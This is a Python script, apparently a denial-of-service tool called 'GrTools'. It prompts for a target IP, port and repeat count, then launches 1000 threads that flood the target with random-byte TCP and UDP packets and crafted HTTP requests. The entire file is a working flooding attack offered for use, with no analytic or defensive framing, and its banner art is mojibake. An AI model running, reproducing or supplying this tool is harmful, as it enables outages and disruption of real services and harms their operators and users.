import socket
import random
import os
import time
import concurrent.futures

error = 'Error Cant Connecting | ip : {ip} port : {port}'
tampilan = """
â•”â•â•â•â•¦â•â•â•â•—    â•”â•â•â•â•â•¦â•â•â•â•¦â•â•â•â•—â”€â”€â•”â•â•â•â•—
â•‘â•”â•â•—â•‘â•”â•â•—â•‘    â•‘â•”â•—â•”â•—â•‘â•”â•â•—â•‘â•”â•â•—â•‘â•‘â”€â”€â•‘â•”â•â•—â•‘
â•‘â•‘â”€â•šâ•£â•šâ•â•â•‘    â•šâ•â•‘â•‘â•šâ•£â•‘â”€â•‘â•‘â•‘â”€â•‘â•‘â•‘â”€â”€â•‘â•šâ•â•â•—
â•‘â•‘â•”â•â•£â•”â•—â•”â•      â•‘â•‘â”€â•‘â•‘â”€â•‘â•‘â•‘â”€â•‘â•‘â•‘â”€â•”â•¬â•â•â•—â•‘
â•‘â•šâ•©â•â•‘â•‘â•‘â•šâ•—      â•‘â•‘â”€â•‘â•šâ•â•â•‘â•šâ•â•â•‘â•šâ•â•â•‘â•šâ•â•â•‘
â•šâ•â•â•â•©â•â•šâ•â•      â•šâ•â”€â•šâ•â•â•â•©â•â•â•â•©â•â•â•â•©â•â•â•â•
"""
print(tampilan)

# Input target details
ip = input("GRC2@root~# Enter Target IP : ")
port = int(input("GRC2@root~# Enter Target PORT : "))
times = int(input("GRC2@root~# Enter TIME : "))

print("""
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚          GrTools Methods           â”‚            
    â”‚  [+] ALLSOCKET                     â”‚           
    â”‚  [+] UDP                           â”‚                                                                                                   
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
       Copyright  GrTools Plan Lifetime       
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
""")

method = input("GRC2@root~# Enter METHOD : ")
if method.upper() == "ALLSOCKET":
    print("VALID METHOD")
else:
    print("METHOD INVALID!")
    time.sleep(2)

# Headers function
def Headers(method):
    header = ""
    if method.upper() == "ALLSOCKET":
        post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        forward = "X-Forwarded-For: 1\r\n"
        forward += "Client-IP: 10000\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        header = post_host + forward + content + connection + length + "\r\n\r\n"
    return header

# Main attack function
def allsocket():
    try:
        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        grtools = os.urandom(16384) + random._urandom(32768)

        # Create request based on method
        if method.upper() == "ALLSOCKET":
            get_host = "GET /Data HTTP/1.1\r\nHost: " + ip + "\r\n"
            request = get_host + Headers(method) + "\r\n"
        else:
            get_host = random.choice(['GET', 'POST', 'HEAD']) + " /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
            request = get_host + Headers(method) + "\r\n"

        # Connect sockets
        tcp_socket.connect((ip, port))
        udp_socket.connect((ip, port))

        print(f"Sending Packets to > ip : {ip} port : {port} | with time => {times} with Method TCP, UDP Flood ")

        # Send packets
        for _ in range(times):
            tcp_socket.send(grtools)
            udp_socket.sendto(grtools, (ip, port))

            tcp_socket.sendall(str.encode(request))
            udp_socket.sendto(grtools, (ip, port))

        print(f"Sending Packets to > ip : {ip} port : {port} | with time => {times} with Method TCP, UDP Flood ")
    except socket.error as e:
        print(error.format(ip=ip, port=port))
    finally:
        tcp_socket.close()
        udp_socket.close()

# Run threads
with concurrent.futures.ThreadPoolExecutor() as executor:
    for _ in range(1000):
        executor.submit(allsocket)
